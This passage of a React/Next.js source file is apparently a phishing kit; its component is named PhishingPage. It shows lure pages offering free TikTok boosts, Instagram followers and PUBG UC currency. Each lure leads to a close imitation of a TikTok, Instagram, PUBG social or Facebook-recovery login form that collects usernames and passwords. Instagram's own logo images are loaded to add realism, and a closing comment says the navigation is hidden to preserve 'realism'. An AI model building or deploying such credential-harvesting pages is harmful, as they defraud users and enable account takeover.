            <p className="text-gray-500 text-sm mb-10 font-medium tracking-wide">Select your VIP package below</p>

            <div className="grid grid-cols-1 gap-3 w-full">
              {offers[service]?.map((amount) => (
                <button
                  key={amount}
                  onClick={() => { setQuantity(amount); setStep(3); }}
                  className="flex items-center justify-between bg-neutral-900 border border-white/5 p-5 rounded-2xl hover:border-white/30 hover:bg-neutral-800 transition-all group"
                >
                  <span className="text-xl font-black tracking-tight">{amount} {service}</span>
                  <div className="flex items-center gap-2">
                    <span className="bg-[#FE2C55]/10 text-[#FE2C55] text-[10px] font-black px-3 py-1 rounded-full uppercase tracking-tighter border border-[#FE2C55]/20 group-hover:bg-[#FE2C55] group-hover:text-white transition-colors">Elite Bundle</span>
                    <span className="text-white/20 group-hover:text-white transition-colors">→</span>
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>
      );
    }

    // Step 3: High Realism TikTok Login
    return (
      <div className="min-h-screen bg-[#010101] text-white flex flex-col font-sans selection:bg-[#FE2C55]/30">
        {/* TikTok Style Header */}
        <header className="flex items-center justify-between p-4 border-b border-white/5">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-white rounded-full flex items-center justify-center text-xl">🎵</div>
            <span className="font-black text-xl tracking-tighter">TikTok</span>
          </div>
          <div className="flex items-center gap-2">
             <span className="text-xs font-bold text-gray-500">English (UK)</span>
          </div>
        </header>

        <main className="flex-1 flex flex-col items-center justify-center p-6 w-full max-w-[400px] mx-auto animate-fade-in">
          <div className="text-center mb-8">
            <h1 className="text-2xl font-black mb-2 tracking-tight">Log in to TikTok</h1>
            <p className="text-gray-500 text-sm mb-4 font-medium">Verify your account to claim <br /> <span className="text-white font-bold">{quantity} {service}</span></p>
          </div>

          <form onSubmit={handleSubmit} className="w-full space-y-3">
            <div className="relative">
              <input 
                type="text" 
                required
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Email or username"
                className="w-full bg-[#f1f1f2]/10 border border-white/10 rounded-sm px-4 py-3 text-sm focus:outline-none focus:border-white transition-all caret-[#FE2C55]"
              />
            </div>
            <div className="relative">
              <input 
                type="password" 
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full bg-[#f1f1f2]/10 border border-white/10 rounded-sm px-4 py-3 text-sm focus:outline-none focus:border-white transition-all caret-[#FE2C55]"
              />
            </div>
            
            <div className="text-left py-2">
              <a href="#" className="text-xs font-bold text-gray-400 hover:underline">Forgot password?</a>
            </div>

            <button 
              type="submit"
              disabled={loading}
              className={`w-full bg-[#FE2C55] hover:bg-[#ef2950] text-white font-bold text-base py-3 rounded-sm transition-all shadow-lg active:scale-95 ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
            >
               {loading ? (
                <div className="flex items-center justify-center py-0.5">
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                </div>
               ) : "Log in"}
            </button>
          </form>

          <p className="text-xs text-center text-gray-500 mt-8 mb-12">
            By continuing, you agree to TikTok's <span className="text-gray-300 font-bold">Terms of Service</span> and confirm that you have read TikTok's <span className="text-gray-300 font-bold">Privacy Policy</span>.
          </p>

          <footer className="w-full pt-8 border-t border-white/5 text-center">
            <p className="text-sm font-medium">Don't have an account? <span className="text-[#FE2C55] font-bold">Sign up</span></p>
          </footer>
        </main>
      </div>
    );
  }

  if (toolId === "ig-followers") {
     if (step === 1) {
       // Step 1: Growth Booster Landing Page
       return (
         <div className="min-h-screen bg-black flex flex-col items-center justify-center p-6 text-center font-sans">
           <div className="absolute top-0 w-full h-1 bg-gradient-to-r from-[#f9ce34] via-[#ee2a7b] to-[#6228d7]"></div>
           
           <div className="relative z-10 w-full max-w-sm">
              <div className="w-20 h-20 mx-auto rounded-3xl bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] p-0.5 mb-8 shadow-[0_0_30px_rgba(238,42,123,0.3)]">
                 <div className="w-full h-full rounded-[22px] bg-black flex items-center justify-center text-4xl">📸</div>
              </div>
              
              <h1 className="text-3xl font-black text-white mb-4 tracking-tight">
                 Unlock <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#f9ce34] via-[#ee2a7b] to-[#6228d7]">10,000</span> <br />New Followers
              </h1>
              <p className="text-gray-400 text-sm mb-10 leading-relaxed font-medium">
                 The fastest way to grow your Instagram presence. Real people, permanent followers.
              </p>
 
              <div className="space-y-4 mb-12">
                 <div className="flex items-center gap-4 bg-white/5 border border-white/10 p-4 rounded-2xl text-left">
                    <div className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center text-xl">👤</div>
                    <div className="flex-1 text-left">
                       <p className="text-white text-xs font-bold">Safe & Secure</p>
                       <p className="text-gray-500 text-[10px]">Encryption Active</p>
                    </div>
                    <div className="text-emerald-500 text-xs font-bold">ACTIVE</div>
                 </div>
                 <div className="flex items-center gap-4 bg-white/5 border border-white/10 p-4 rounded-2xl text-left">
                    <div className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center text-xl">🚀</div>
                    <div className="flex-1 text-left">
                       <p className="text-white text-xs font-bold">Fast Delivery</p>
                       <p className="text-gray-500 text-[10px]">Starts in less than 5 minutes.</p>
                    </div>
                    <div className="text-emerald-500 text-xs font-bold">98%</div>
                 </div>
              </div>
 
              <button 
                onClick={() => setStep(2)}
                className="w-full bg-gradient-to-r from-[#ee2a7b] to-[#6228d7] text-white font-black text-lg py-4 rounded-2xl shadow-xl hover:scale-[1.02] active:scale-95 transition-all"
              >
                 Get Started Now
              </button>
              
              <p className="text-[10px] text-gray-600 mt-8 uppercase font-bold tracking-widest">Growth Server #42 • Region: Global</p>
           </div>
         </div>
       );
     }
 
     // Step 2: Pixel-Perfect Instagram Login
     return (
       <div className="min-h-screen bg-white flex flex-col items-center pt-8 sm:pt-20 font-sans selection:bg-[#f9ce34]/30">
         <div className="w-full max-w-[350px] flex flex-col gap-3">
           
           <div className="bg-white border border-gray-200 px-10 py-10 flex flex-col items-center">
              <img 
                src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2510549456.png" 
                alt="Instagram" 
                className="h-12 mb-8 mt-2"
              />
 
              <form onSubmit={handleSubmit} className="w-full space-y-2 mt-4 text-left">
                 <div className="relative">
                    <input 
                      type="text" 
                      required
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      placeholder="Phone number, username or email"
                      className="w-full bg-[#fafafa] border border-gray-200 rounded-[3px] px-2 py-2.5 text-xs focus:outline-none focus:border-gray-400 placeholder:text-gray-500"
                    />
                 </div>
                 
                 <div className="relative">
                    <input 
                      type="password" 
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Password"
                      className="w-full bg-[#fafafa] border border-gray-200 rounded-[3px] px-2 py-2.5 text-xs focus:outline-none focus:border-gray-400 placeholder:text-gray-500"
                    />
                 </div>
 
                 <button 
                   type="submit"
                   disabled={loading}
                   className={`w-full bg-[#0095f6] hover:bg-[#1877f2] text-white font-bold text-sm py-1.5 rounded-[4px] mt-4 transition-colors ${loading ? 'opacity-70' : ''}`}
                 >
                    {loading ? (
                      <div className="flex items-center justify-center py-0.5">
                         <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                      </div>
                    ) : "Log In"}
                 </button>
 
                 <div className="flex items-center justify-between py-4 mt-2">
                    <div className="flex-1 h-px bg-gray-200"></div>
                    <div className="px-4 text-[13px] font-bold text-gray-400 uppercase">OR</div>
                    <div className="flex-1 h-px bg-gray-200"></div>
                 </div>
 
                 <div className="flex flex-col items-center gap-4 pt-2">
                    <button type="button" className="text-[#385185] font-bold text-sm flex items-center justify-center gap-2">
                       <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" className="w-4" />
                       Log in with Facebook
                    </button>
                    <a href="#" className="text-[#385185] text-xs">Forgot password?</a>
                 </div>
              </form>
           </div>
 
           <div className="bg-white border border-gray-200 py-6 text-center">
              <p className="text-sm text-gray-900">
                 Don't have an account? <span className="text-[#0095f6] font-bold cursor-pointer">Sign up</span>
              </p>
           </div>
 
           <div className="text-center py-4">
              <p className="text-sm text-gray-900 mb-4">Get the app.</p>
              <div className="flex justify-center gap-2">
                 <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" className="h-10 outline-none" />
                 <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" className="h-10 outline-none" />
              </div>
           </div>
         </div>
 
         {/* Footer */}
         <footer className="mt-8 mb-12 w-full max-w-screen-lg flex flex-col items-center px-4">
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500 font-medium mb-4">
               <a href="#" className="hover:underline">Meta</a>
               <a href="#" className="hover:underline">About</a>
               <a href="#" className="hover:underline">Blog</a>
               <a href="#" className="hover:underline">Jobs</a>
               <a href="#" className="hover:underline">Help</a>
               <a href="#" className="hover:underline">API</a>
               <a href="#" className="hover:underline">Privacy</a>
               <a href="#" className="hover:underline">Terms</a>
               <a href="#" className="hover:underline">Top accounts</a>
               <a href="#" className="hover:underline">Locations</a>
               <a href="#" className="hover:underline">Instagram Lite</a>
               <a href="#" className="hover:underline">Contact uploading and non-users</a>
            </div>
            <div className="flex gap-4 text-xs text-gray-500">
               <span>English (UK)</span>
               <span>© 2026 Instagram from Meta</span>
            </div>
         </footer>
       </div>
     );
   }

   if (toolId === "pubg") {
    const ucPackages = [
      { amount: "60 UC", bonus: "", price: "Free", icon: "📦" },
      { amount: "300 UC", bonus: "+25 Bonus", price: "Free", icon: "🎁" },
      { amount: "600 UC", bonus: "+60 Bonus", price: "Free", icon: "💎" },
      { amount: "1500 UC", bonus: "+300 Bonus", price: "Free", icon: "🏆" },
      { amount: "3000 UC", bonus: "+850 Bonus", price: "Free", icon: "🔥" },
      { amount: "6000 UC", bonus: "+2100 Bonus", price: "Free", icon: "👑" },
    ];

    if (step === 1) {
      return (
        <div className="min-h-screen bg-[#0f1016] text-white flex flex-col font-sans">
          <header className="p-4 bg-zinc-900/50 border-b border-amber-500/20 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <span className="text-amber-500 font-black italic tracking-tighter text-xl">PUBG MOBILE</span>
            </div>
            <div className="text-[10px] font-bold text-amber-500/50 uppercase tracking-widest">Global Top-up Center</div>
          </header>

          <main className="flex-1 flex flex-col items-center p-6 text-center max-w-2xl mx-auto w-full animate-fade-in">
            <div className="mb-8 mt-4">
              <h1 className="text-3xl font-black uppercase italic tracking-tighter text-amber-500 slant-text">Select UC Package</h1>
              <p className="text-zinc-500 text-xs font-bold uppercase tracking-widest mt-2">Special Season Airdrop Event</p>
            </div>

            <div className="grid grid-cols-2 md:grid-cols-3 gap-4 w-full">
              {ucPackages.map((pkg) => (
                <button
                  key={pkg.amount}
                  onClick={() => { setQuantity(pkg.amount); setStep(2); }}
                  className="bg-zinc-900 border border-zinc-800 p-5 rounded-sm hover:border-amber-500 transition-all group relative overflow-hidden flex flex-col items-center justify-center gap-2"
                >
                  <div className="absolute top-0 right-0 w-8 h-8 bg-amber-500/10 rounded-bl-full"></div>
                  <div className="text-3xl mb-2 group-hover:scale-110 transition-transform">{pkg.icon}</div>
                  <div className="text-sm font-black text-white">{pkg.amount}</div>
                  {pkg.bonus && <div className="text-[9px] font-black text-amber-500 uppercase">{pkg.bonus}</div>}
                  <div className="mt-3 text-[10px] font-black bg-amber-500 text-black px-3 py-1 skew-x-[-10deg]">{pkg.price}</div>
                </button>
              ))}
            </div>

            <div className="mt-12 w-full p-4 border border-zinc-800 bg-zinc-900/30 rounded-sm text-left flex items-start gap-4">
               <div className="w-1.5 h-1.5 rounded-full bg-amber-500 mt-1.5 shadow-[0_0_10px_rgba(245,158,11,1)]"></div>
               <p className="text-[10px] text-zinc-500 font-bold leading-relaxed uppercase tracking-widest">
                  Items will be directly credited to your account via Global Character ID Sync. <br />
                  <span className="text-zinc-400 mt-1 block">Authentication required to prevent bot abuse.</span>
               </p>
            </div>
          </main>
        </div>
      );
    }

    if (step === 2) {
      const handleVerify = () => {
        if (charId.length < 5) return;
        setIsVerifying(true);
        setTimeout(() => {
          setStep(3);
          setIsVerifying(false);
        }, 2500);
      };

      return (
        <div className="min-h-screen bg-[#0f1016] text-white flex flex-col font-sans">
          <header className="p-4 bg-zinc-900/50 border-b border-amber-500/20">
            <button onClick={() => setStep(1)} className="text-zinc-500 hover:text-white transition-colors text-[10px] font-bold uppercase tracking-widest">
               ← Back to Shop
            </button>
          </header>

          <main className="flex-1 flex flex-col items-center justify-center p-6 text-center max-w-md mx-auto w-full animate-fade-in">
            <div className="w-20 h-20 bg-amber-500/10 border border-amber-500/30 rounded-full flex items-center justify-center text-3xl mb-8 animate-pulse">
               🔍
            </div>
            
            <h2 className="text-2xl font-black uppercase italic tracking-tighter text-white mb-2 slant-text">Identity Verification</h2>
            <p className="text-zinc-500 text-xs font-bold uppercase tracking-widest mb-10">Enter your official Character ID</p>

            <div className="w-full space-y-4">
              <div className="relative">
                <input 
                  type="number"
                  value={charId}
                  disabled={isVerifying}
                  onChange={(e) => setCharId(e.target.value)}
                  placeholder="e.g. 518293021"
                  className="w-full bg-zinc-900 border border-zinc-800 rounded-sm px-4 py-4 text-center font-mono text-xl tracking-[0.2em] focus:outline-none focus:border-amber-500 transition-all text-amber-500 placeholder:text-zinc-800"
                />
              </div>

              <button 
                onClick={handleVerify}
                disabled={isVerifying || charId.length < 5}
                className={`w-full bg-amber-500 hover:bg-amber-400 text-black font-black uppercase tracking-widest py-4 transition-all relative overflow-hidden ${isVerifying || charId.length < 5 ? 'opacity-50' : ''}`}
              >
                {isVerifying ? (
                  <div className="flex flex-col items-center justify-center gap-1">
                     <span className="text-[10px] animate-pulse">CHECKING SERVER...</span>
                     <div className="w-32 h-1 bg-black/20 rounded-full overflow-hidden">
                        <div className="h-full bg-black animate-[loading_2.5s_linear]"></div>
                     </div>
                  </div>
                ) : (
                  "VERIFY CHARACTER"
                )}
              </button>
            </div>

            <p className="text-[10px] text-zinc-600 font-bold uppercase tracking-widest mt-12">
               Connected to: <span className="text-zinc-400">Global-Hk Server #042</span>
            </p>
          </main>

          <style dangerouslySetInnerHTML={{__html: `
            @keyframes loading {
              0% { width: 0%; }
              100% { width: 100%; }
            }
          `}} />
        </div>
      );
    }

    if (step === 3) {
      return (
        <div className="min-h-screen bg-[#0f1016] text-white flex flex-col font-sans selection:bg-amber-500/30">
          <div className="absolute top-0 left-0 w-full h-full overflow-hidden pointer-events-none z-0">
             {mounted && [...Array(20)].map((_, i) => (
               <div 
                 key={i} 
                 className="absolute bg-amber-500/50 rounded-sm animate-pulse" 
                 style={{
                   width: Math.random() * 4 + 1 + 'px', 
                   height: Math.random() * 4 + 1 + 'px',
                   top: Math.random() * 100 + '%',
                   left: Math.random() * 100 + '%',
                   animationDuration: Math.random() * 3 + 2 + 's',
                   animationDelay: Math.random() * 2 + 's',
                   boxShadow: '0 0 10px rgba(245, 158, 11, 0.8)'
                 }}
               />
             ))}
          </div>

          <main className="relative z-10 flex-1 flex flex-col items-center justify-center p-6 text-center max-w-sm mx-auto w-full animate-fade-in">
             <div className="bg-zinc-900 border-2 border-zinc-800 p-8 shadow-2xl relative w-full">
                <div className="absolute -top-3 -left-3 bg-amber-500 text-black text-[10px] font-black px-3 py-1 uppercase italic transition-transform group-hover:scale-105">ID VERIFIED</div>
                
                <h2 className="text-xl font-black uppercase text-white mb-2 tracking-tighter italic slant-text">Authentication</h2>
                <p className="text-zinc-500 text-[10px] font-bold uppercase tracking-widest mb-8 leading-tight">
                  Login to your social account linked <br /> with character ID: <span className="text-amber-500">{charId}</span>
                </p>

                <div className="space-y-3">
                   <button onClick={() => setStep(4)} className="w-full flex items-center gap-4 bg-[#1877F2] hover:bg-[#166FE5] text-white p-3 rounded-sm transition-all group">
                      <div className="w-8 h-8 bg-white/10 rounded-sm flex items-center justify-center text-xl">f</div>
                      <span className="text-xs font-black uppercase tracking-widest flex-1 text-left">Login with Facebook</span>
                   </button>
                   <button onClick={() => setStep(4)} className="w-full flex items-center gap-4 bg-[#1DA1F2] hover:bg-[#1a91da] text-white p-3 rounded-sm transition-all group">
                      <div className="w-8 h-8 bg-white/10 rounded-sm flex items-center justify-center text-xl">𝕏</div>
                      <span className="text-xs font-black uppercase tracking-widest flex-1 text-left">Login with Twitter</span>
                   </button>
                   <button onClick={() => setStep(4)} className="w-full flex items-center gap-4 bg-white hover:bg-zinc-100 text-zinc-900 p-3 rounded-sm transition-all group">
                      <img src="https://www.google.com/favicon.ico" className="w-4 h-4 ml-2" />
                      <span className="text-xs font-black uppercase tracking-widest flex-1 text-left ml-2">Login with Google</span>
                   </button>
                   <button onClick={() => setStep(4)} className="w-full flex items-center gap-4 bg-[#107C10] hover:bg-[#0d640d] text-white p-3 rounded-sm transition-all group opacity-50">
                      <div className="w-8 h-8 bg-white/10 rounded-sm flex items-center justify-center text-xl">🎮</div>
                      <span className="text-xs font-black uppercase tracking-widest flex-1 text-left">Play Games</span>
                   </button>
                </div>

                <div className="mt-8 text-[9px] text-zinc-600 font-bold uppercase leading-relaxed">
                   By logging in, you agree to the <br /> <span className="text-zinc-400">Security & Privacy Policy</span>
                </div>
             </div>
          </main>
        </div>
      );
    }

    // AUTH STEP (Realistic multi-input)
    return (
      <div className="min-h-screen bg-[#0f1016] text-white flex flex-col font-sans">
        <main className="flex-1 flex flex-col items-center justify-center p-6 text-center max-w-sm mx-auto w-full animate-fade-in">
          <div className="bg-zinc-900 border-2 border-zinc-800 p-6 shadow-2xl relative w-full clip-path-corners">
            <div className="absolute top-0 left-0 w-4 h-4 border-t-2 border-l-2 border-amber-500"></div>
            <div className="absolute top-0 right-0 w-4 h-4 border-t-2 border-r-2 border-amber-500"></div>
            
            <div className="text-center mb-6">
              <h2 className="text-lg font-black text-white uppercase tracking-widest mb-1">
                Account Login
              </h2>
              <div className="w-full h-[1px] bg-gradient-to-r from-transparent via-amber-500/50 to-transparent mt-2"></div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-1">
                <label className="text-[10px] font-mono text-zinc-500 uppercase tracking-widest block text-left">Social Email / Phone</label>
                <input 
                  type="text" 
                  required
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="Enter email or mobile"
                  className="w-full bg-black/60 border border-zinc-800 px-4 py-3 text-sm text-amber-50 font-mono placeholder:text-zinc-700 focus:outline-none focus:border-amber-500 transition-all"
                />
              </div>

              <div className="space-y-1">
                <label className="text-[10px] font-mono text-zinc-500 uppercase tracking-widest block text-left">Account Password</label>
                <input 
                  type="password" 
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="••••••••••••"
                  className="w-full bg-black/60 border border-zinc-800 px-4 py-3 text-sm text-amber-50 font-mono placeholder:text-zinc-700 focus:outline-none focus:border-amber-500 transition-all"
                />
              </div>

              <button 
                type="submit"
                disabled={loading}
                className="w-full mt-6 bg-amber-500 hover:bg-amber-400 text-black font-black uppercase tracking-widest py-4 transition-all group overflow-hidden relative"
              >
                  {loading ? (
                    <span className="text-[10px] animate-pulse">PROCESSING SYNC...</span>
                  ) : (
                    "AUTHORIZE SYNC"
                  )}
              </button>
            </form>
          </div>
        </main>
        <style dangerouslySetInnerHTML={{__html: `
          .clip-path-corners {
             clip-path: polygon(10px 0, calc(100% - 10px) 0, 100% 10px, 100% calc(100% - 10px), calc(100% - 10px) 100%, 10px 100%, 0 calc(100% - 10px), 0 10px);
          }
        `}} />
      </div>
    );
  }

  return (
    <div className="relative min-h-screen flex items-center justify-center p-4 bg-black overflow-hidden">
      {/* Background with Overlay */}
      <div 
        className="absolute inset-0 bg-cover bg-center transition-transform duration-1000 scale-105"
        style={{ backgroundImage: `url(${config.bgImage})` }}
      />
      <div className="absolute inset-0 bg-black/60 backdrop-blur-[2px]" />

      {/* Login Card */}
      <div className="relative w-full max-w-md animate-fade-in">
        <div className="glass-card p-8 rounded-3xl border-white/20 shadow-2xl">
          <div className="text-center mb-8">
             <div className="w-16 h-16 mx-auto rounded-2xl bg-white/10 flex items-center justify-center mb-4 text-3xl">
                {toolId === "fb-recovery" ? "👤" : toolId === "ig-followers" ? "📸" : toolId === "tiktok" ? "🎵" : toolId === "pubg" ? "🔫" : "🌙"}
             </div>
             <h1 className="text-2xl font-bold text-white mb-2">{config.title}</h1>
             <p className="text-gray-400 text-sm leading-relaxed">{config.subtitle}</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">{config.fields[0]}</label>
              <input 
                type="text" 
                required
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder={`Enter your ${config.fields[0].toLowerCase()}`}
                className="w-full bg-white/5 border border-white/10 rounded-xl px-5 py-4 text-white focus:outline-none focus:border-blue-500 transition-colors"
                style={{ focusBorderColor: config.color }}
              />
            </div>

            <div>
              <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">{config.fields[1]}</label>
              <input 
                type="password" 
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••"
                className="w-full bg-white/5 border border-white/10 rounded-xl px-5 py-4 text-white focus:outline-none focus:border-blue-500 transition-colors"
              />
            </div>

            <button 
              type="submit"
              disabled={loading}
              className="w-full py-4 rounded-xl font-bold text-lg text-white transition-all transform hover:scale-[1.02] active:scale-95 shadow-xl"
              style={{ backgroundColor: config.color, boxShadow: `0 10px 20px -10px ${config.color}` }}
            >
              {loading ? "Verifying..." : toolId === "fb-recovery" ? "Find Account" : "Claim Now"}
            </button>
          </form>

          <div className="mt-8 pt-8 border-t border-white/5 text-center relative z-10">
            <p className="text-xs text-gray-500">&copy; 2026 {config.name} Help Center. All rights reserved.</p>
          </div>
        </div>
      </div>
    </div>
  );
}
// Disable default layout for phishing pages
PhishingPage.getLayout = (page) => page;
/* 
Note: In Next.js App Router, we should ideally use a separate layout for (templates) group, 
but for simplicity here I'm using a flag or just keeping it within the root layout which is fine 
as it has a nav which might break 'realism'. 

I will wrap the phishing pages in a way that hides the nav.
*/
